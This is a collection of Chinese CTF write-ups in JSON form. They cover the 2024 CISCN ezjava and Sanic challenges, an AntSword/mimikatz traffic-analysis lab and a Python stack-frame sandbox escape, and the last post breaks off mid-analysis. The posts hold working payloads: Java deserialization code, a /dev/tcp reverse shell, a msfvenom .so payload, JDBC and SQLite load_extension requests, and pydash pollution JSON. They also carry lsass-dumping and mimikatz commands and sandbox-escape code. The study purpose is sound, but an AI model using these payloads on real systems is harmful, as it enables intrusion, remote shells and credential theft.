{"posts":[{"title":"2024CISCN ezjava复现","text":"起点首先打开题目，可以看到一个JDBC连接页面 猜测题目是跟JDBC ATTACK有关，把题目给的附件app.jar扔到jadx逆向还原，导出源码 源码分析用IDEA打开导出的源码，进入com/example/jdbctest目录分析 分析发现controller/JdbcController.java定义了请求路由 关注services/DatasourceServiceImpl.java，发现其定义了数据库连接的类型，其中url可控且存在利用点，类型1对应Mysql，类型3对应Sqlite 那我们可以尝试打MySQL JDBC反序列化写文件和SQLite SSRF读文件，但是具体怎么打呢 继续分析，在META-INF/maven/com.example/jdbcTest/pom.xml发现aspectjweaver 同时关注到bean/UserBean.java有个readObject可以执行反序列化，且里面参数可控 可以打aspectjweaver反序列化，那思路就很清晰了，我们通过aspectjweaver反序列化写恶意so文件，然后用mysql jdbc反序列化开虚假mysql服务写入恶意文件，最后用sqlite ssrf加载so文件即可 利用过程AspectJWeaver反序列化aspectjweaver中有一个SimpleCache类，SimpleCache类中的内部类StoreableCachingMap是一个继承HashMap的类，其重写了HashMap的put方法，put方法中的writeToPath方法执行了写入文件的操作 具体可以参考文章：AspectJWeaver反序列化利用链 然后我们重新看看UserBean.java，里面的name、age都可控，obj可控因此a也可控，且内容age会进行base64解码后再写入 可以通过反射来获取属性，用setAccessible绕过访问限制，再修改其对应的值，可以参考上面文章的简单demo部分来写 具体payload如下 1234567891011121314151617181920212223242526272829303132333435363738394041package com.example.test;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Main { public static void main(String[] args) throws Exception { Constructor con = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;).getDeclaredConstructor(String.class,int.class); con.setAccessible(true); HashMap map = (HashMap)con.newInstance(&quot;/tmp/&quot;, 1); //存放路径，必须要存在的 Constructor constructor = Class.forName(&quot;com.example.jdbctest.bean.UserBean&quot;).getDeclaredConstructor(); constructor.setAccessible(true); Object userBean = constructor.newInstance(); Class cls = userBean.getClass(); Field field = cls.getDeclaredField(&quot;obj&quot;); field.setAccessible(true); field.set(userBean, map); Field field1 = cls.getDeclaredField(&quot;name&quot;); field1.setAccessible(true); field1.set(userBean, &quot;evil.so&quot;); //文件名 Field field2 = cls.getDeclaredField(&quot;age&quot;); field2.setAccessible(true); String payload = &quot;&quot;; //文件内容 field2.set(userBean, payload); byte[] bytes = serialize(userBean); System.out.println(new String(Base64.getEncoder().encode(bytes))); } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); }} 文件内容我们就写恶意so文件导出的base64编码 先将要执行的命令进行base64编码 123bash -c &quot;bash -i &gt;&amp; /dev/tcp/你的vps地址/8888 0&gt;&amp;1&quot;得到 YmFzaCAtYyAiYmFzaCAtaSA+Jxxxxxxx 用msfvenom创建恶意so文件 1msfvenom -p linux/x64/exec CMD='echo 编码后的内容|base64 -d|bash' -f elf-so -o evil.so 接着执行cat evil.so | base64 -w0获取so文件编码后的内容，base64 -w0表示不换行 复制这段内容到payload里面，执行获取编码后的序列化数据 MySQL JDBC反序列化接下来就是打mysql jdbc反序列化写文件，制作虚假mysql服务 原理可以参考：MySQL JDBC 反序列化漏洞分析 这里用工具Fake Server来制作虚假服务，链接：https://github.com/4ra1n/mysql-fake-server 把上面执行得到的序列化数据写入Gadget，如图所示，按顺序执行 ip这里要说下，由于一般本地电脑是没有公网ip的，你写自己的电脑ip进去是不行的，那怎么办，建议最好有个服务器吧，在服务器部署frp服务，然后内网穿透进行反向代理，可以参考文章内网穿透神器FRP部署教程，快的话十几分钟就可以，或者你买个短期的静态ip地址来用 我这里用frp进行反向代理连接我本地的端口 弄完之后，点击Copy Payload复制payload，然后重新打开题目网页选择Mysql随便输入内容抓个包，看看格式 把里面的url改成我们刚才复制的payload，然后发包 1{&quot;type&quot;:&quot;1&quot;,&quot;url&quot;:&quot;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ1VTVE9N&quot;} 获得如下结果就说明成功了 SQLite JDBC加载恶意动态链接库最后就是通过SQLite加载恶意文件 可以参考文章：SQLite With SSRF 先在服务器开启nc监听 1nc -lvvp 8888 然后构造payload发包，由于load_extension默认是关闭的，需要enable_load_extension=true开启才能用 1{&quot;type&quot;:&quot;3&quot;,&quot;tableName&quot;:&quot;(select(load_extension(\\&quot;/tmp/evil.so\\&quot;)));&quot;,&quot;url&quot;:&quot;jdbc:sqlite:file:/tmp/db?enable_load_extension=true&quot;} 成功反弹shell 读取flag文件发现权限不够，ls -l查看权限，发现flag没有执行权限，但是readflag存在执行权限，直接执行获取flag 总结这道题用到了很多知识点，包括AspectJWeaver反序列化、MySQL JDBC反序列化和SQLite SSRF等，总体来说有些难度，也是参考了很多资料，建议深入学习这些知识点，尤其是JDBC方面的漏洞和Java反射机制，做题做下来感觉基础很重要，学好了做这种题就会轻松很多，与君共勉，继续加油！！","link":"/posts/2024CISCN_ezjava/"},{"title":"2024CISCN Sanic复现","text":"Sanic框架介绍Sanic 是一个基于 Python 的高性能异步 Web 框架，利用 Python 的 async/await 语法实现非阻塞、高并发请求处理。它设计轻量、易用，支持快速定义路由、中间件和 WebSocket，适合构建现代化、响应迅速的 Web 应用和 API，性能在 Python Web 框架中处于领先地位 简单示例 1234567891011from sanic import Sanicfrom sanic.response import jsonapp = Sanic(&quot;MyApp&quot;)@app.route(&quot;/&quot;)async def index(request): return json({&quot;message&quot;: &quot;Hello, Sanic!&quot;})if __name__ == &quot;__main__&quot;: app.run(host=&quot;127.0.0.1&quot;, port=8000) 题目复现这里我们用ctfshow的环境来复现 起点打开网站后访问/src获取源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute: def __init__(self): passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route('/', methods=['GET', 'POST'])async def index(request): return html(open('static/index.html').read())@app.route(&quot;/login&quot;)async def login(request): user = request.cookies.get(&quot;user&quot;) if user.lower() == 'adm;n': request.ctx.session['admin'] = True return text(&quot;login success&quot;) return text(&quot;login fail&quot;)@app.route(&quot;/src&quot;)async def src(request): return text(open(__file__).read())@app.route(&quot;/admin&quot;, methods=['GET', 'POST'])async def admin(request): if request.ctx.session.get('admin') == True: key = request.json['key'] value = request.json['value'] if key and value and type(key) is str and '_.' not in key: pollute = Pollute() pydash.set_(pollute, key, value) return text(&quot;success&quot;) else: return text(&quot;forbidden&quot;) return text(&quot;forbidden&quot;)if __name__ == '__main__': app.run(host='0.0.0.0') 发现/admin路由有pydash.set_(pollute, key, value)，且题目特意标明pydash==5.1.2，网上搜索可知可以用于参数污染，我们尝试污染__file__，但是需要先满足request.ctx.session.get('admin') == True 先看/login 12345678@app.route(&quot;/login&quot;)async def login(request): user = request.cookies.get(&quot;user&quot;) if user.lower() == 'adm;n': request.ctx.session['admin'] = True return text(&quot;login success&quot;) return text(&quot;login fail&quot;) 在cookie接受参数user，当user.lower() == 'adm;n'时返回true，但是直接传adm;n肯定是不行的，分号会截断内容 环境准备这时我们可以分析一下代码，简单讲一下环境配置 在源码中可以看到导入的依赖文件 先创建并激活虚拟环境 12python -m venv venvvenv\\Scripts\\activate 接着安装依赖 1pip install sanic sanic-session pydash==5.1.2 然后PyCharm打开site-packages文件即可 绕过方法在sanic/cookies/request.py可以看到有关cookie的解码逻辑 可以看到这里将八进制转换为ASCII编码，然后开头要求字符串两端为双引号，那就很好绕过了，分号的八进制编码为\\073，在/login处传入Cookie 1user=&quot;adm\\073n&quot; 成功登录 接着就是源码里的if key and value and type(key) is str and '_.' not in key:判断，要求不能出现_.，继续分析代码，在 pydash/utilities.py找到方法to_path_tokens 跟进RE_PATH_KEY_DELIM，可以看到 正则里的 (?&lt;!\\\\) 是“负向零宽断言”，意思是匹配点号的这个位置，前面不能是单个反斜杠 \\，然后(?:\\\\\\\\)* 是匹配偶数个反斜杠，因为每两个 \\ 表示一个反斜杠，两个反斜杠的成对出现会让点号有效，也就是说前面有成对的反斜杠不算转义，例如__init__\\\\\\\\.__globals__会解析为__init__.__globals__，解析时点号正常分割 那_.的问题就解决了，可以开始进行污染链的构造了 污染链构造先在/login处传入Cookie，获取session的值，浏览器会自动保存 接着我们构造链子读取文件，用HackBar的话记得要将enctype改为application/json 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;} 然后重新访问/src目录，成功污染 尝试污染路径为根目录下的flag，发现不行，说明flag要么不在这里要么不叫这个名字，而污染__file__只能是读取文件，那先放着，换个思路试试 继续分析，在源码处可以看到app.static这个注册路由，我们在本地site-packages目录创建个文件（main.py），把题目源码复制进去，方便后续分析 先看看static的定义 在注释处可以看到有两个关键参数说明 意思大概是directory_view为true时，会开启列目录功能，而directory_handler可以获取指定的目录 跟进directory_handler，这里我们要找directory_handler是如何定义的 可以看到有个方法DirectoryHandler，继续跟进看看 成功找到值的初始化定义，我们想办法污染这两个参数，让directory_view为true，然后directory为我们想要的目录 但是我们应该通过什么进行污染，为了进一步分析，我们需要在本地进行调试，这里简单改一下源码（main.py），把鉴权代码全部注释掉方便后续调试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute: def __init__(self): passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)# Session(app)# @app.route('/', methods=['GET', 'POST'])# async def index(request):# return html(open('static/index.html').read())# @app.route(&quot;/login&quot;)# async def login(request):# user = request.cookies.get(&quot;user&quot;)# if user.lower() == 'adm;n':# request.ctx.session['admin'] = True# return text(&quot;login success&quot;)## return text(&quot;login fail&quot;)@app.route(&quot;/src&quot;, methods=['GET', 'POST'])async def src(request): return text(open(__file__).read())@app.route(&quot;/admin&quot;, methods=['GET', 'POST'])async def admin(request):# if request.ctx.session.get('admin') == True: key = request.json['key'] value = request.json['value'] if key and value and type(key) is str and '_.' not in key: pollute = Pollute() pydash.set_(pollute, key, value) return text(&quot;success&quot;) else: return text(&quot;forbidden&quot;)# return text(&quot;forbidden&quot;)if __name__ == '__main__': app.run(host='127.0.0.1', port=8000)# 修改地址为本地 在src处打断点 然后重新访问/src，我们要分析的是与路由有关的方法和变量，需要知道的是，app.router 是 Sanic 中管理所有路由的对象，负责存储和调度请求对应的处理函数，找到app.router 有点多，看着会有点晕，不过因为directory_view是在static方法下，所以我们找有关static的路由即可，发现name_index、routes_all等符合条件 然后我们修改src代码，方便后续调试 1234@app.route(&quot;/src&quot;, methods=['GET', 'POST'])async def src(request): eval(request.args.get('code'))# 加个eval用于执行代码 return text(open(__file__).read()) name_index 是一个内部字典，键是路由的名字，值是这个路由对应的路由对象。我们可以通过app.router.name_index[]来查看注册路由 1http://127.0.0.1:8000/src?code=print(app.router.name_index) __mp_main__.static对应的路径为static/&lt;__file_uri__:path&gt;，意味着它会匹配 /static/ 目录下的文件请求，我们可以通过app.router.name_index['__mp_main__.static']查看具体信息 接下来分析如何调用到DirectoryHandler里，全局搜索name_index，看看是如何定义的 我们在这里打个断点，然后回到main.py进行调试分析 可以看到具体的属性 我们直接读取directory_view的值看看 1http://127.0.0.1:8000/src?code=print(app.router.name_index['__mp_main__.static'].handler.keywords['directory_handler'].directory_view) 可以看到返回值为false，尝试污染参数试试，因为__mp_main__.static这个路由名称本身就含有.，点号不是分隔符，因此用两个反斜杠即可 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;:true} 再次查看参数值，可以看到成功污染 在当前目录新建/static/目录（随便放个文件），然后浏览器访问测试，成功查看到内容 如果我们尝试用routes_all的话会发现不行，可以自行测试看看 接下来就是污染directory的路径，但是却发现报错了 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory&quot;,&quot;value&quot;:&quot;/&quot;} 说明不能这样子污染，我们继续调试代码，发现是directory对象的parts属性控制的值，但这是个元组，不能直接修改 那我们回到directory.py分析directory是如何定义的，可以看到有个Path方法 跟进Path方法，然后定位到__new__ 方法，当用户通过 Path() 创建路径对象时会自动调用__new__方法 这里有个需要注意的点，如果你用的Python版本比较新（例如Python3.12），则__new__ 方法内容如下 完全没有可利用的点，在这里卡了很久，跟网上的教程案例不太一样，后面发现是新版本修复了这里，可以通过降低Python版本解决（如Python3.9），但是之前用Python3.12创建的venv环境就不能用了，需要重新创建一个，有点麻烦 发现调用了_from_parts方法，继续跟进 其中self._parts = parts 里的 parts 是 _parse_args 方法解析传入路径参数后得到的路径组成部分列表，假如args 为('usr/local/bin',)，那么_parse_args 会把它切分为三部分：drv为空，root为空，parts 为 ['usr', 'local', 'bin'] parts会把值传给_parts，我们看能不能控制，尝试访问_parts属性 返回了数组而不是元组，也就是说可以进行修改了，我们可以通过污染_parts来指定目录 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;:[&quot;E:\\\\test&quot;]} 传入后再重新读取_parts属性，成功修改 本地调试完了，咱们重新回到ctfshow 最终利用先访问/login传入Cookie登录 1user=&quot;adm\\073n&quot; 然后污染directory_view为true 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;:true} 接着污染directory._parts为根目录 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;:[&quot;/&quot;]} 再次访问/static/查看根目录内容 可以看到flag名为24bcbd0192e591d6ded1_flag，我们污染__file__为目标文件路径 1{&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;:&quot;/24bcbd0192e591d6ded1_flag&quot;} 然后访问/src读取即可 至此复现完成，前前后后在网上参考了很多资料，确实挺难的，不过收获挺大，继续加油","link":"/posts/2024CISCN_Sanic/"},{"title":"玄机靶场 | 流量特征分析-蚂蚁爱上树","text":"前言玄机靶场日常刷题训练，刚好重温一下蚁剑流量分析和mimikatz用法 知识准备蚁剑流量特征每个请求体通常以@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);开头 请求体包含base64编码内容 响应包一般是明文，但也可能存在加密情况，结果通常为随机字符和返回结果 Content-Type通常为 application/x-www-form-urlencoded，表明数据是以标准表单形式编码的 mimikatz简单用法先用procdump抓取lsass转储文件 获取lsass进程id 1tasklist /svc | findstr lsass.exe 抓取 lsass.dmp 文件 1procdump64.exe -accepteula -ma &lt;LSASS_PID&gt; lsass.dmp 然后mimikatz解密lsass.dmp文件 特权提升 1mimikatz # privilege::debug 加载dmp文件 1mimikatz # sekurlsa::minidump lsass.dmp 凭据提取，导出其中的明文密码 1mimikatz # sekurlsa::logonpasswords 索引 玄机题目步骤#1管理员Admin账号的密码是什么？ 首先通过语法筛选出http流量并过滤掉404状态码的流量包 1http and !(http.response.code == 404) 然后快速分析一遍流量，发现product2.php有问题 这里涉及到一句话木马，可以确定这个就是webshell文件，然后解码请求包的base64内容 左下解码处选择Base64，可以看到解码后的内容符合蚁剑特征，因此确定这是以蚁剑为媒介的一次攻击行为 因为蚁剑与网站是通过POST方法进行通信的，所以我们重新改进一下筛选语法，直接筛选出方法为POST且包含文件名product2.php的流量，可以缩小分析范围 1http.request.method == POST and http.request.uri contains &quot;product2.php&quot; 逐个分析流量，解码base64数据，因为蚁剑的特性，前两位是随机值，所以开始位置调整为2，最后发现No.15190数据包有问题 执行了系统命令net user admin Password1 /add，也就是添加一个名为admin的用户，然后密码设置为Password1，但是此时该用户并不是管理员，分析下一个数据包，可以看到 攻击者将admin用户添加进本地管理员组，从此刻起该用户admin才具有管理员权限 因此答案就是这个用户的密码 1flag{Password1} 步骤#2LSASS.exe的程序进程ID是多少？ 继续分析流量，发现No.4069数据包有问题 可以看到攻击者执行了命令 1rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full 我们分析一下 rundll32.exe: 这是一个 Windows 系统程序，用于运行 DLL（动态链接库）文件中的函数。它本身不执行任何操作，而是作为调用 DLL 函数的宿主 comsvcs.dll: 这是一个系统 DLL 文件，包含了 COM+ 服务相关的函数。在这个命令中，它被用来调用其内部的 MiniDump 函数 MiniDump: 这是 comsvcs.dll 中的一个函数，用于创建指定进程的内存转储。内存转储是进程在某个时间点的内存快照，通常用于调试或故障排除 852: 这是要进行内存转储的进程的 PID（进程 ID） C:\\Temp\\OnlineShopBackup.zip: 这是内存转储文件的输出路径和文件名。尽管文件名是 .zip，但它实际上是一个原始的内存转储文件，并不是一个压缩文件 full: 这是一个参数，指定了内存转储的类型。表示创建一个完整的内存转储，包含进程的所有内存信息。其他参数还包括 mini (较小的转储) 或 heap (只包含堆信息) 等 简而言之，这条命令就是先找到 PID 为 852 的进程，然后创建一个该进程的完整内存快照，并将这个内存快照保存到C:\\Temp\\OnlineShopBackup.zip文件中 因此LSASS.exe的程序进程ID就是852 1flag{852} 步骤#3用户WIN101的密码是什么? 要获取用户WIN101的密码，需要我们把前面提到的完整内存快照下载下来，也就是OnlineShopBackup.zip，然后用mimikatz分析 因此我们需要导出http对象 文本过滤器输入product2.php，缩小对象范围，同时按照大小降序来排列，因为dmp文件比较大 可以看到第一个文件大小为47MB，就是我们要找的dmp文件，导出到桌面，用010editor打开验证 开头显示MDMP，可以确定是dmp文件，但是前面多了e1c1709这几个字符，直接放入mimikatz解密会报错，因此需要先删掉，然后将文件后缀改为dmp，放到跟mimikatz同一个目录 记得mimikatz以管理员身份运行 运行命令获取系统密码 12sekurlsa::minidump product2.dmpsekurlsa::logonpasswords 然后找到用户名为win101的NTLM哈希值 得到哈希值为 1282d975e35846022476068ab5a3d72df 对NTLM的md5解密即可 1flag{admin#123} 参考momo安全：https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw","link":"/posts/Xuanji-CTF-AntSword-and-Mimikatz/"},{"title":"Python栈帧沙箱逃逸","text":"基础知识什么是生成器生成器（Generator）是Python中一种特殊的迭代器，它通过函数和表达式来创建，可以逐个产生值，并在每次生成一个值后暂停执行，保留当前状态，以便下一次调用时能够从暂停的地方继续执行 生成器函数使用yield语句生成值，而不是普通函数的return，调用生成器函数返回的是一个生成器对象，每次调用该对象的next()方法时，生成器函数会从上次暂停的位置继续执行，直到遇到下一个yield或函数结束 举个简单的例子 123456789def generator(): yield 1 yield 2 yield 3g = generator()print(next(g)) # 输出1print(next(g)) # 输出2print(next(g)) # 输出3 生成器表达式为了更方便的书写，我们可以用生成器表达式，这是Python中创建生成器对象的一种简洁语法，形式类似列表推导式，但用的是圆括号() 12g = (i for i in range(3)) print(g) # 输出&lt;generator object &lt;genexpr&gt; at 0x0000025FF5AA5B40&gt; 通过next()方法来逐步执行 1234g = (i for i in range(3)) print(next(g)) # 输出0print(next(g)) # 输出1... 如果一直逐步执行的话太麻烦了，我们可以用循环来执行，有很多方法，这里列举几个常用的 for循环遍历生成器 1234567g = (i for i in range(3)) for i in g: print(i)# 输出# 0# 1# 2 列表推导式循环创建列表 12g = (i for i in range(3))print([ i for i in g ]) # [0, 1, 2] 解包操作构造列表 12g = (i for i in range(3))print([*g]) # [0, 1, 2] 生成器属性生成器的常用属性主要包括： gi_code：生成器对应的代码对象，包含生成器函数的字节码和相关信息 gi_frame：生成器当前运行的帧对象（当前执行的位置、局部变量等） gi_running：表示生成器是否正在执行，True表示运行中，False表示空闲，例如next(g)执行的时候是True，执行前、执行后都是False gi_yieldfrom：当前生成器遇到的 yield from 语句引用的子生成器对象 gi_frame.f_locals：可以访问生成器当前帧的局部变量字典 其中用的比较多的是gi_frame，它指向该生成器当前执行的栈帧对象，用于保存该生成器函数在执行过程中的上下文信息。可以理解为函数执行的“快照”，包括当前执行到了哪条指令、局部变量、全局变量等 举个例子 12345678def gen(): yield 1 yield 2g = gen()print(g.gi_code) # &lt;code object gen at 0x0000017A385FBB40, file &quot;/z3.py&quot;, line 1&gt;print(g.gi_frame) # &lt;frame at 0x0000017A385B6A30, file '/z3.py', line 1, code gen&gt;print(g.gi_running) # False 栈帧Python中，栈帧是运行时管理函数调用和执行状态的关键数据结构。它包含了函数执行时的所有重要信息，如当前执行位置、局部变量、参数、返回地址等，任何函数调用都会创建一个栈帧，函数退出时栈帧销毁 栈帧包含以下重要属性 f_locals：局部变量字典，可以查看和修改生成器当前帧的局部变量 f_globals：全局变量字典，存储当前模块的全局变量 f_code：代码对象，包含字节码指令等函数定义信息 f_lasti：当前执行的指令索引，指示执行到了哪条字节码指令 f_back：指向上一级调用栈帧，可用于追踪调用链 获取栈帧的方式同样也很多 sys._getframe() sys._getframe()函数用于获取当前或指定深度的栈帧，语法是sys._getframe([depth])，depth是可选参数，表示从当前调用帧起向上追溯的层数，0表示当前帧，1表示上一个调用帧，以此类推 举个例子 1234567891011import sysdef foo(depth=0): frame = sys._getframe() for _ in range(depth): frame = frame.f_back return frameprint(foo(0)) # 当前帧，&lt;frame at 0x0000024CF2CAA9B0, file '/z3.py', line 7, code foo&gt;print(foo(1)) # 上一帧，&lt;frame at 0x0000024CF2C05B40, file '/z3.py', line 10, code &lt;module&gt;&gt;print(foo(2)) # 再上一帧，None inspect模块的currentframe() inspect.currentframe()返回当前调用的栈帧 12345678import inspectdef foo(): frame = inspect.currentframe() print(frame)foo()# &lt;frame at 0x000002A5C9216EC0, file '/z3.py', line 5, code foo&gt; 通过生成器的gi_frame属性 生成器对象保存当前执行的栈帧，可直接访问gi_frame，查看执行状态和局部变量 1234567def foo(): x = 1 yield xf = foo()print(f.gi_frame)# &lt;frame at 0x000001DFE2355DD0, file '/z3.py', line 1, code foo&gt; 我们需要重点掌握的就是栈帧回溯，后续我们的栈帧沙箱逃逸就是基于此进行 举个例子 1234567891011import sysf1 = sys._getframe()def func(): f2 = sys._getframe() print(f2.f_back is f1) # True print(f2) # &lt;frame at 0x000001F13D735A80, file '/z3.py', line 7, code func&gt; print(f2.f_back) # &lt;frame at 0x000001F13D745DD0, file '/z3.py', line 10, code &lt;module&gt;&gt;func()print(f1) # &lt;frame at 0x000001F13D745DD0, file '/z3.py', line 11, code &lt;module&gt;&gt; 可以看到，f2.f_back对应的帧地址和f1相同，均为0x000001F13D745DD0 利用栈帧进行沙箱逃逸一般情况下这种题目的逻辑是 12345678910flag = &quot;this is flag&quot;code = &quot;&quot;&quot;接受用户输入代码&quot;&quot;&quot;# 过滤compiled_code = compile(code)# 过滤exec( compiled_code, None, # globals None # locals) 通过对用户输入的数据进行过滤，导致很多方法无法使用，这时候可以利用栈帧进行沙箱逃逸，代码如下 12q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])g = [*q][0] 生成器在创建时会生成栈帧，第一个f_back跳出生成器，第二个f_back跳出exec包围圈，最后调用f_globals获取全局globals 前面我们讲到获取栈帧的方法还有sys._getframe()函数和inspect模块的currentframe()，但这两个由于需要import外部模块，import本身以及sys、inspect可能都被禁用了，所以就用gi_frame来获取栈帧 运行生成器的话你可以不用解包操作，用列表推导式或循环遍历都可以，具体情况视题目而定。至于为什么next()不可以呢，因为next属于builtins模块，builtins一般都被禁用了 题目解析2024CISCN mossfern这道题是关于Python栈帧沙箱逃逸，我们用ctfshow的环境来复现 首先下载源码进行分析，可以看到存在路由/run且通过Json来传输数据 然后传入的数据被送到runner.py进行过滤，随后进行exec执行代码，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697def source_simple_check(source): &quot;&quot;&quot; Check the source with pure string in string, prevent dangerous strings :param source: source code :return: None &quot;&quot;&quot; from sys import exit from builtins import print try: source.encode(&quot;ascii&quot;) except UnicodeEncodeError: print(&quot;non-ascii is not permitted&quot;) exit() for i in [&quot;__&quot;, &quot;getattr&quot;, &quot;exit&quot;]: if i in source.lower(): print(i) exit()def block_wrapper(): &quot;&quot;&quot; Check the run process with sys.audithook, no dangerous operations should be conduct :return: None &quot;&quot;&quot; def audit(event, args): from builtins import str, print import os for i in [&quot;marshal&quot;, &quot;__new__&quot;, &quot;process&quot;, &quot;os&quot;, &quot;sys&quot;, &quot;interpreter&quot;, &quot;cpython&quot;, &quot;open&quot;, &quot;compile&quot;, &quot;gc&quot;]: if i in (event + &quot;&quot;.join(str(s) for s in args)).lower(): print(i) os._exit(1) return auditdef source_opcode_checker(code): &quot;&quot;&quot; Check the source in the bytecode aspect, no methods and globals should be load :param code: source code :return: None &quot;&quot;&quot; from dis import dis from builtins import str from io import StringIO from sys import exit opcodeIO = StringIO() dis(code, file=opcodeIO) opcode = opcodeIO.getvalue().split(&quot;\\n&quot;) opcodeIO.close() for line in opcode: if any(x in str(line) for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;]): if any(x in str(line) for x in [&quot;randint&quot;, &quot;randrange&quot;, &quot;print&quot;, &quot;seed&quot;]): break print(&quot;&quot;.join([x for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;] if x in str(line)])) exit()if __name__ == &quot;__main__&quot;: from builtins import open from sys import addaudithook from contextlib import redirect_stdout from random import randint, randrange, seed from io import StringIO from random import seed from time import time source = open(f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;, &quot;r&quot;).read() source_simple_check(source) source_opcode_checker(source) code = compile(source, &quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;) addaudithook(block_wrapper()) outputIO = StringIO() with redirect_stdout(outputIO): seed(str(time()) + &quot;THIS_IS_SEED&quot; + str(time())) exec(code, { &quot;__builtins__&quot;: None, &quot;randint&quot;: randint, &quot;randrange&quot;: randrange, &quot;seed&quot;: seed, &quot;print&quot;: print }, None) output = outputIO.getvalue() if &quot;THIS_IS_SEED&quot; in output: print(&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;) print(&quot;bad code-operation why still happened ah?&quot;) else: print(output) runner.py构建了一个多层沙箱来执行用户代码，简单解释一下： 静态字符串检测 (source_simple_check): 检查源码是否包含__、getattr、exit等字符串（不区分大小写） 字节码检测 (source_opcode_checker): 检查代码编译后的字节码，禁止了LOAD_GLOBAL、IMPORT_NAME、LOAD_METHOD等操作码，但白名单允许randint、randrange、print、seed这几个函数的使用 运行时审计 (block_wrapper): 使用sys.addaudithook在运行时监控并禁止了open, os, sys等一系列敏感事件 执行环境限制: 通过exec(code, {&quot;__builtins__&quot;: None, ...})执行代码，__builtins__被设为None，并且全局作用域中只提供了randint, randrange, seed, print 四个函数 限制得很死，很多方法都没法用，这时我们就可以考虑用栈帧回溯来做，核心思路如下 12q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])globals = [*q][0] 获取到全局变量之后就可以尝试获取builtins模块，双下划线被过滤我们可以用字符串拼接完成 1builtins = globals['_'+'_builtins_'+'_'] 接下来就是想办法绕过block_wrapper检查，因为audithook是运行时审计，所以想通过变量赋值方式绕过是不行的 如果检测到名单中的字符串就会打印并退出，因为print是在builtins模块里的，因此我们可以重写print方法，修改os._exit为其他函数即可成功跳出该沙箱 代码跟上面获取builtins的方式差不多，因为os在本地符号表，所以这里我们用locals，然后用setattr来重写os._exit 这里往上跳两层到本地就可以，不需要跳到全局，具体如下 123456def rewrite_print(a): q = (q.gi_frame.f_back.f_back.f_locals for _ in [1]) locals = [*q][0] if 'os' in locals: builtins.setattr(locals['os'], '_ex'+'it', print)builtins.print = rewrite_print 接下来从builtins提取eval，获取import再导入os调用system即可实现RCE 1234eval = builtins.evalimp = eval('builtins._'+'_import_'+'_')system = imp(&quot;os&quot;).systemsystem(&quot;ls /&quot;) 将上面的拼接起来，可以得到一个骨架 123456789101112131415q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])globals = [*q][0]builtins = globals['_'+'_builtins_'+'_']def rewrite_print(a): q = (q.gi_frame.f_back.f_back.f_locals for _ in [1]) locals = [*q][0] if 'os' in locals: builtins.setattr(locals['os'], '_ex'+'it', print)builtins.print = rewrite_printeval = builtins.evalimp = eval('builtins._'+'_import_'+'_')system = imp(&quot;os&quot;).systemsystem(&quot;ls /&quot;) 最后我们想办法绕过source_opcode_checker，仔细分析可以发现该函数存在一个逻辑漏洞 123456for line in opcode: if any(x in str(line) for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;]): if any(x in str(line) for x in [&quot;randint&quot;, &quot;randrange&quot;, &quot;print&quot;, &quot;seed&quot;]): break print(&quot;&quot;.join([x for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;] if x in str(line)])) exit() 